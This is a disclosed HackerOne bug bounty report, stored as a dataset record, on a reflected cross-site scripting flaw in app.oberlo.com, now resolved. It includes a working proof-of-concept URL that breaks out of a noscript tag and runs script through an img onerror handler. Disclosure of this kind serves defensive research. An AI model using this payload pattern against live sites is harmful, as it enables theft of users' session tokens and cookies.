---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '569241'
original_report_id: '569241'
title: Reflected XSS
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: shopify
created_at: '2019-05-06T17:19:55.447Z'
disclosed_at: '2019-05-28T16:12:49.542Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 47
asset_identifier: oberlo.com
asset_type: URL
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS

## Metadata

- HackerOne Report ID: 569241
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: shopify
- Disclosed At: 2019-05-28T16:12:49.542Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team ,
I found a reflected xss on https://app.oberlo.com domain .

##Reproduce :
* Visit **https://app.oberlo.com/auth?shop=%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E** in latest version of firefox browser .
* You will see popup like attacked screenshot : {F485407}

**Tested in Latest version of firefox**

## Impact

As this is a **auth** so this xss can lead to some serious issues like stealing users **auth** token or stealing browser data/cookies .

Best Regards
**Prial**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
